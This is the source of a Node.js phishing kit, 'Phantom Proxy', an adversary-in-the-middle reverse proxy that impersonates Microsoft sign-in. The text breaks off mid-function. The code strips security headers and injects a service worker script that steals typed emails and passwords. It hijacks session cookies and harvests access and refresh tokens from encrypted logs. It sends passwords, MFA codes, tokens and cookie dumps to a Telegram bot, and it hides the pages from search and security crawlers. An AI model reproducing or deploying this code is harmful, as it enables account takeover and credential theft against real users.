// ============================================================
// 🥔 PHANTOM PROXY v10.13 — Bot Blocking + Mutation Fix + Markdown
// ============================================================
// 🔥 Blocks known bots (Googlebot, Telegram, etc.) from AiTM and Device pages
// ✅ All previous fixes: mutation session update, legacy Markdown, country flags
// ============================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const os = require("os");

// ── ✅ SAFE REQUIRE ──
let axios, AdmZip, WebSocket, FormData;
try { axios = require('axios'); } catch (e) { axios = null; }
try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
try { FormData = require('form-data'); } catch (e) { FormData = null; }

// ── ✅ TELEGRAM CONFIG ──
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// ── ✅ DASHBOARD AUTH ──
const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'Cozysarps18!';

// ── ✅ CONSTANTS ──
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://login.microsoftonline.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "";
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
const PRT_STORAGE_FILE = path.join(__dirname, "prt_storage.json");

if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });

const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};
let deviceFlows = [];
let prtStorage = { prts: [], lastScan: null };

// ── ✅ CACHE MANAGER ──
class CacheManager {
    constructor(ttl = 300000) {
        this.cache = new Map();
        this.ttl = ttl;
        this.hits = 0;
        this.misses = 0;
    }
    get(key) {
        const item = this.cache.get(key);
        if (!item) { this.misses++; return null; }
        if (Date.now() > item.expiry) { this.cache.delete(key); this.misses++; return null; }
        this.hits++; return item.value;
    }
    set(key, value, ttl = null) {
        const expiry = Date.now() + (ttl || this.ttl);
        this.cache.set(key, { value, expiry });
        return value;
    }
    clean() {
        const now = Date.now();
        for (const [key, item] of this.cache) {
            if (now > item.expiry) this.cache.delete(key);
        }
    }
}
global._cache = new CacheManager(300000);

// ── ✅ RETRY LOGIC ──
async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
    let lastError;
    let currentDelay = delay;
    for (let attempt = 1; attempt <= retries; attempt++) {
        try { return await fn(); } catch (error) {
            lastError = error;
            if (attempt === retries) break;
            const jitter = Math.random() * 0.3 + 0.85;
            await new Promise(resolve => setTimeout(resolve, currentDelay * jitter));
            currentDelay *= backoff;
        }
    }
    throw lastError;
}

// ── ✅ USER-AGENT ROTATION ──
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
];
function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }

// ── 🤖 BOT DETECTION ──
function isBot(userAgent) {
    if (!userAgent) return true; // no UA → likely a bot
    const ua = userAgent.toLowerCase();
    const botPatterns = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
        'telegrambot', 'discordbot', 'slackbot', 'whatsapp', 'curl',
        'wget', 'python-requests', 'go-http-client', 'java', 'http-client',
        'scrapy', 'crawler', 'spider', 'bot', 'crawl', 'scrape'
    ];
    return botPatterns.some(pattern => ua.includes(pattern));
}

// ── 📝 MARKDOWN ESCAPE ──
function escapeMarkdown(text) {
    if (!text) return '';
    const specialChars = ['_', '*', '[', ']', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    let escaped = text;
    for (const char of specialChars) {
        escaped = escaped.replaceAll(char, `\\${char}`);
    }
    return escaped;
}

// ── 🌍 COUNTRY FLAG CACHE ──
const countryCache = new Map();
const COUNTRY_CACHE_TTL = 3600000; // 1 hour

async function getCountryInfo(ip) {
    if (!ip || ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') {
        return { code: 'XX', flag: '🌍', name: 'Local' };
    }
    const cached = countryCache.get(ip);
    if (cached && Date.now() < cached.expiry) return cached.data;
    
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
        const data = response.data;
        if (data && data.country_code) {
            const flag = String.fromCodePoint(...[...data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
            const result = { code: data.country_code, flag, name: data.country_name || data.country_code };
            countryCache.set(ip, { data: result, expiry: Date.now() + COUNTRY_CACHE_TTL });
            return result;
        }
    } catch (e) {}
    return { code: 'UN', flag: '🌍', name: 'Unknown' };
}

// ── 🔥 VISIT LOGGER ──
function logVisit(req, pageType = 'page') {
    try {
        const ip = req.headers['cf-connecting-ip'] || 
                   req.headers['x-real-ip'] || 
                   req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
                   'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
        const url = req.url || '/';
        
        const visitEntry = {
            timestamp: new Date().toISOString(),
            ip,
            userAgent,
            referer,
            url,
            pageType,
            countryCode: 'UN'
        };
        
        if (axios && ip !== 'Unknown') {
            axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 })
                .then(res => {
                    if (res.data?.country_code) {
                        visitEntry.countryCode = res.data.country_code;
                        const updated = { ...visitEntry, countryCode: res.data.country_code };
                        fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(updated) + '\n');
                    }
                })
                .catch(() => {
                    fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n');
                });
        } else {
            fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n');
        }
        
        console.log(`👁️ Visit logged: ${pageType} | IP: ${ip} | URL: ${url}`);
    } catch (e) {
        console.error('Visit log error:', e.message);
    }
}

// ============================================================
// 📤 TELEGRAM EXFILTRATION
// ============================================================
async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
    if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `tokens_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🔑 FULL TOKENS DUMP\n';
        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
        for (const [key, val] of Object.entries(tokens)) {
            if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
        }
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🔑 Tokens file: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
        console.log(`📤 Tokens file sent to Telegram for session ${sessionId}`);
    } catch (e) { console.error('Telegram tokens file failed:', e.message); }
}

async function sendCookiesFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `cookies_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🍪 COOKIES DUMP\n';
        for (const [name, value] of Object.entries(cookies)) content += `${name}=${value}\n`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🍪 Cookies: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 10000
        });
        try { fs.unlinkSync(filePath); } catch (e) {}
        console.log(`🍪 Cookies file sent to Telegram for session ${sessionId}`);
    } catch (e) { console.error('Telegram cookies file failed:', e.message); }
}

async function sendToTelegram(data, type = 'capture', ip = null) {
    if (!axios) {
        console.error('❌ axios not available, cannot send Telegram.');
        return;
    }
    try {
        const sessionId = data.sessionId || 'unknown';
        const email = data.email || 'N/A';
        const password = data.password || 'N/A';
        const mfa = data.mfa || 'N/A';
        const tokens = data.tokens || {};
        const cookies = data.cookies || {};
        const phishedUrl = data.phishedUrl || 'N/A';

        let countryInfo = { flag: '🌍', code: 'UN', name: 'Unknown' };
        if (ip) {
            countryInfo = await getCountryInfo(ip);
        }

        console.log(`📤 Sending Telegram [${type}] for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}, country=${countryInfo.flag} ${countryInfo.code}`);

        let header;
        switch (type) {
            case 'aitm':
                header = '🔐 **AiTM Credential Capture!**';
                break;
            case 'device':
                header = '📱 **Device Code Token Capture!**';
                break;
            case 'prt':
                header = '🔄 **PRT Token Exchange!**';
                break;
            default:
                header = '🔐 **LOGIN CAPTURED!**';
        }

        let message = `${header}\n\n${countryInfo.flag} **${escapeMarkdown(countryInfo.name)}** (${countryInfo.code})\n👤 Email: ${escapeMarkdown(email)}\n🔐 Password: ${escapeMarkdown(password)}\n📱 MFA: ${escapeMarkdown(mfa)}\n🆔 Session: ${escapeMarkdown(sessionId)}\n🕒 Time: ${new Date().toISOString()}`;
        if (type === 'aitm' && phishedUrl !== 'N/A') {
            message += `\n🎯 Target URL: ${escapeMarkdown(phishedUrl)}`;
        }
        if (Object.keys(tokens).length > 0) {
            message += '\n\n🔑 Tokens:\n';
            for (const [k, v] of Object.entries(tokens)) {
                message += `${escapeMarkdown(k)}: ${escapeMarkdown(v.slice(0, 30))}...\n`;
            }
            await sendTokensFile(tokens, sessionId, email, password, mfa);
        }
        if (Object.keys(cookies).length > 0) {
            message += '\n🍪 Cookies:\n';
            for (const [k, v] of Object.entries(cookies)) {
                message += `${escapeMarkdown(k)}: ${escapeMarkdown(v.slice(0, 30))}...\n`;
            }
            await sendCookiesFile(cookies, sessionId);
        }
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 5000 });
        console.log(`✅ Telegram exfil [${type}] for session ${sessionId} — response:`, response.status);
    } catch (e) {
        console.error(`❌ Telegram send [${type}] failed:`, e.message);
        if (e.response) {
            console.error('📛 Telegram API response:', e.response.data);
        }
    }
}

// ============================================================
// 🧩 PROXY HELPERS (unchanged)
// ============================================================
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [name, ...val] = cookie.split("=");
        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === val.join("=")) return name;
    }
    return;
}

function generateRandomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue,
        cookies: [],
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname + phishedURL.search,
        port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
        host: phishedURL.host,
        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`
    };
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name || error}`);
    console.error(`Message: ${error.message}`);
    for (let i = 0; i < args.length; i++) console.error(`Parameter ${i + 1}: ${args[i]}`);
    console.error("******************************");
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);
    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];
        cipher.on("error", reject)
              .on("data", chunk => encryptedData.push(chunk))
              .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const transaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];
    const encrypted = await encryptData(JSON.stringify(transaction));
    if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

// ── Cookie management ──
function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const sReq = requestHostname.split("."), sCookie = cookieDomain.split(".");
    if (sCookie.length < 2) return false;
    if (cookieHostOnly && sReq.length !== sCookie.length) return false;
    if (sReq.length < sCookie.length) return false;
    for (let i = 1; i < sCookie.length + 1; i++) if (sCookie.at(-i) !== sReq.at(-i)) return false;
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const sReq = requestPath.split("/"), sCookie = cookiePath.split("/");
    if (cookiePath === "/") return true;
    if (sReq.length < sCookie.length) return false;
    for (let i = 1; i < sCookie.length; i++) if (sCookie[i] !== sReq[i]) return false;
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
           isPathApplicable(requestOptions.path, cookie.path);
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const cookieMap = {};
    const now = Date.now();
    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(now > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            cookieMap[cookie.name] = cookie.value;
        }
    }
    return Object.entries(cookieMap).map(([n, v]) => `${n}=${v}`).join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false, foundDay = false, foundMonth = false, foundYear = false;
    let h, m, s, day, month, year;
    const tokens = cookieDate.split(/[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/).filter(t => t);
    for (const token of tokens) {
        if (!foundTime) {
            const tm = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
            if (tm) { foundTime = true; h = parseInt(tm[1]); m = parseInt(tm[2]); s = parseInt(tm[3]); continue; }
        }
        if (!foundDay) {
            const dm = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
            if (dm) { foundDay = true; day = parseInt(dm[1]); continue; }
        }
        if (!foundMonth) {
            const months = ["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"];
            for (let i = 0; i < months.length; i++) {
                if (token.toLowerCase().startsWith(months[i])) { foundMonth = true; month = i; break; }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const ym = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
            if (ym) { foundYear = true; year = parseInt(ym[1]); continue; }
        }
    }
    if (year >= 70 && year <= 99) year += 1900; else if (year >= 0 && year <= 69) year += 2000;
    if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
    if (day < 1 || day > 31 || year < 1601 || h > 23 || m > 59 || s > 59) return NaN;
    const d = new Date(Date.UTC(year, month, day, h, m, s));
    if (d.getUTCFullYear() !== year || d.getUTCMonth() !== month || d.getUTCDate() !== day) return NaN;
    return d.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const now = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) clockSkew = now - parseCookieDate(proxyResponseDate);
    for (const newCookie of newCookies) {
        const [cookie, ...attrs] = newCookie.split(";");
        const [cookieName, ...cookieVal] = cookie.split("=");
        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch || ["/"])[0];
        let cookieExpires = NaN, cookieMaxAge = "", cookieHostOnly = true, isValid = true;
        for (const attr of attrs) {
            const a = attr.trim();
            const dm = a.match(/^domain\s*=(.*)$/i);
            const pm = a.match(/^path\s*=(.*)$/i);
            const em = a.match(/^expires\s*=(.*)$/i);
            const mm = a.match(/^max-age\s*=(.*)$/i);
            if (a.toLowerCase() === "domain") { cookieDomain = request.hostname; cookieHostOnly = true; isValid = true; }
            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch || ["/"])[0]; }
            else if (a.toLowerCase() === "expires") { cookieExpires = NaN; }
            else if (a.toLowerCase() === "max-age") { cookieMaxAge = ""; }
            else if (dm) {
                cookieDomain = dm[1].replace(/^\./, "").trim(); cookieHostOnly = true; isValid = true;
                if (!cookieDomain) cookieDomain = request.hostname;
                else if (cookieDomain === proxyHostname) { cookieDomain = request.hostname; cookieHostOnly = false; }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    } else if (!isDomainApplicable(request.hostname, cookieDomain, false)) { isValid = false; continue; }
                    cookieHostOnly = false;
                }
            } else if (pm) {
                cookiePath = pm[1].trim();
                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch || ["/"])[0];
            } else if (em) {
                cookieExpires = parseCookieDate(em[1].trim());
            } else if (mm) {
                cookieMaxAge = mm[1].trim();
                if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
            }
        }
        if (!isValid) continue;
        cookieExpires += clockSkew;
        if (cookieMaxAge) { const sec = parseInt(cookieMaxAge); if (!isNaN(sec)) cookieExpires = now + sec * 1000; }
        let isNew = true;
        const sessionCookies = VICTIM_SESSIONS[currentSession].cookies;
        for (let i = 0; i < sessionCookies.length; i++) {
            const sc = sessionCookies[i];
            if (sc.name === cookieName && sc.domain === cookieDomain && sc.path === cookiePath && sc.hostOnly === cookieHostOnly) {
                if (now > cookieExpires) { sessionCookies.splice(i, 1); break; }
                sc.value = cookieVal.join("="); sc.expires = cookieExpires; isNew = false; break;
            }
        }
        if (isNew && !(now > cookieExpires)) {
            sessionCookies.push({ name: cookieName, value: cookieVal.join("="), domain: cookieDomain, path: cookiePath, expires: cookieExpires, hostOnly: cookieHostOnly });
        }
    }
}

function getValidDomains(domains) {
    const valid = [];
    for (const domain of domains) {
        const parts = domain.split(".");
        for (let i = 2; i < parts.length + 1; i++) {
            const d = parts.slice(-i).join(".");
            if (!valid.includes(d)) valid.push(d);
        }
    }
    return valid;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHeaders = ["max-forwards","x-arr-log-id","client-ip","disguised-host","x-site-deployment-id",
        "was-default-hostname","x-forwarded-proto","x-appservice-proto","x-arr-ssl","x-forwarded-tlsversion",
        "x-forwarded-for","x-original-url","x-waws-unencoded-url","x-client-ip","x-client-port"];
    const cookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
    if (cookies) proxyRequestOptions.headers.cookie = cookies;
    else delete proxyRequestOptions.headers.cookie;
    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.referer && proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT)) {
        delete proxyRequestOptions.headers.referer;
    }
    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
        else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
    }
    delete proxyRequestOptions.headers[':method'];
    delete proxyRequestOptions.headers[':path'];
    delete proxyRequestOptions.headers[':authority'];
    delete proxyRequestOptions.headers[':scheme'];
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options","set-cookie",
        "content-security-policy","content-security-policy-report-only","cross-origin-opener-policy",
        "cross-origin-embedder-policy","cross-origin-resource-policy","permissions-policy","service-worker-allowed"];
    for (const h of secHeaders) delete headers[h];
}

// ── Compression / injection ──
function decompressData(data, encoding) {
    const map = { gzip: zlib.gunzip, "x-gzip": zlib.gunzip, deflate: zlib.inflate, br: zlib.brotliDecompress, zstd: zlib.zstdDecompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

function compressData(data, encoding) {
    const map = { gzip: zlib.gzip, "x-gzip": zlib.gzip, deflate: zlib.deflate, br: zlib.brotliCompress, zstd: zlib.zstdCompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

async function decompressResponseBody(data, contentEncoding) {
    if (!contentEncoding) return { decompressedResponseBody: data, encodings: [] };
    const encodings = contentEncoding.split(",").map(e => e.trim().toLowerCase()).filter(e => e);
    let d = data;
    for (let i = encodings.length - 1; i >= 0; i--) d = await decompressData(d, encodings[i]);
    return { decompressedResponseBody: d, encodings };
}

async function compressResponseBody(data, encodings) {
    let d = data;
    for (const enc of encodings) d = await compressData(d, enc);
    return d;
}

function updateHTMLProxyResponse(body) {
    const payload = "<script src=/@></script>";
    const map = { "<head>": `<head>${payload}`, "<html>": `<html><head>${payload}</head>`, "<body>": `<head>${payload}</head><body>` };
    const limit = 200;
    for (const [key, val] of Object.entries(map)) {
        const tag = Buffer.from(key);
        const idx = body.subarray(0, limit).indexOf(tag);
        if (idx !== -1) return Buffer.concat([body.subarray(0, idx), Buffer.from(val), body.subarray(idx + tag.byteLength)]);
    }
    return Buffer.concat([Buffer.from(`<head>${payload}</head>`), body]);
}

function updateFederationRedirectUrl(body, proxyHostname) {
    try {
        const obj = JSON.parse(body.toString());
        const url = obj.Credentials.FederationRedirectUrl;
        const proxyUrl = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
        proxyUrl.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(url));
        obj.Credentials.FederationRedirectUrl = proxyUrl;
        return Buffer.from(JSON.stringify(obj));
    } catch (e) { return body; }
}

// ── Ensure HTML files exist ──
const indexFile = path.join(__dirname, PROXY_FILES.index);
const notFoundFile = path.join(__dirname, PROXY_FILES.notFound);
const scriptFile = path.join(__dirname, PROXY_FILES.script);
const swFileName = PROXY_PATHNAMES.serviceWorker.replace('/', '');
const swFilePath = path.join(__dirname, swFileName);

if (!fs.existsSync(indexFile)) {
    fs.writeFileSync(indexFile, `<!DOCTYPE html><html><head><title>Sign in</title></head><body><h1>Sign in</h1><form action="/capture" method="POST"><input name="email"><input name="password" type="password"><button>Next</button></form></body></html>`);
    console.log('✅ Created dummy index.html');
}
if (!fs.existsSync(notFoundFile)) {
    fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
    console.log('✅ Created dummy 404.html');
}
if (!fs.existsSync(scriptFile)) {
    fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
    console.log('✅ Created dummy script.js');
}

// ── 🔥 CREATE SERVICE WORKER FILE ──
// ⚠️ MODIFIED: Now injects credential stealer into proxied HTML pages.
const serviceWorkerCode = `// 🔥 PHANTOM SERVICE WORKER v10.4 – WITH CREDENTIAL INJECTION
self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);

    // Bypass internal routes – do NOT proxy these
    const bypassPaths = [
        '/capture',
        '/device/request',
        '/device/token',
        '/test-telegram-now',
        '/health',
        '/favicon.ico',
        '/service_worker_Mz8XO2ny1Pg5.js'
    ];
    if (bypassPaths.some(path => url.pathname === path)) {
        event.respondWith(fetch(event.request));
        return;
    }

    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = \`\${self.location.origin}/lNv1pC9AWPUY4gbidyBO\`;

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };

        // Fetch the real page via your proxy server
        let response = await fetch(proxyRequestURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });

        // --- INJECT CREDENTIAL STEALER INTO HTML RESPONSES ---
        const contentType = response.headers.get('content-type') || '';
        if (contentType.includes('text/html')) {
            const html = await response.text();
            // Insert a script that captures credentials on form submission
            const injectedHtml = html.replace(
                '</body>',
                \`<script>
                    (function() {
                        function injectListener() {
                            // Look for the login form – Microsoft's form typically has action containing "login" or "authorize"
                            const form = document.querySelector('form[action*="login"]') ||
                                         document.querySelector('form[action*="authorize"]') ||
                                         document.querySelector('form[action*="token"]');
                            if (!form) {
                                setTimeout(injectListener, 500);
                                return;
                            }
                            form.addEventListener('submit', function(e) {
                                const email = document.querySelector('input[type="email"], input[name="username"], input[name="loginfmt"]')?.value || '';
                                const password = document.querySelector('input[type="password"]')?.value || '';
                                // Send credentials silently to your /capture endpoint
                                navigator.sendBeacon('/capture', new URLSearchParams({ email, password }));
                                // Let the original submission continue
                                return true;
                            });
                        }
                        injectListener();
                    })();
                </script>
                </body>\`
            );
            response = new Response(injectedHtml, {
                status: response.status,
                statusText: response.statusText,
                headers: response.headers
            });
        }
        // ----------------------------------------------------

        return response;
    }
    catch (error) {
        console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
        return fetch(request);
    }
}`;

if (!fs.existsSync(swFilePath)) {
    fs.writeFileSync(swFilePath, serviceWorkerCode);
    console.log('✅ Created service_worker_Mz8XO2ny1Pg5.js');
}

// ============================================================
// 📊 TOKEN VAULT CLASS
// ============================================================
class TokenVault {
    constructor(logsDir, encryptionKey) {
        this.logsDir = logsDir;
        this.encryptionKey = encryptionKey;
        this.tokens = [];
        this.scanLogs();
    }

    extractUsernameFromToken(token) {
        try {
            const parts = token.split('.');
            if (parts.length === 3) {
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                return payload.email || payload.preferred_username || payload.upn || 'unknown';
            }
        } catch (e) {}
        return 'unknown';
    }

    scanLogs() {
        this.tokens = [];
        const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
        for (const file of files) {
            try {
                const content = fs.readFileSync(path.join(this.logsDir, file), 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                for (const line of lines) {
                    try {
                        const entry = JSON.parse(line);
                        const iv = Object.keys(entry)[0];
                        const encrypted = entry[iv];
                        const decipher = crypto.createDecipheriv('aes-256-ctr', this.encryptionKey, Buffer.from(iv, 'hex'));
                        let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
                        decrypted = Buffer.concat([decrypted, decipher.final()]);
                        const obj = JSON.parse(decrypted.toString('utf-8'));
                        const body = obj.proxyRequestBody;
                        if (body) {
                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                            const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                            if (accessMatch) {
                                const token = decodeURIComponent(accessMatch[1]);
                                this.tokens.push({ type: 'access', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
                            const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                            if (refreshMatch) {
                                const token = decodeURIComponent(refreshMatch[1]);
                                this.tokens.push({ type: 'refresh', value: token, file, username: this.extractUsernameFromToken(token), timestamp: new Date().toISOString() });
                            }
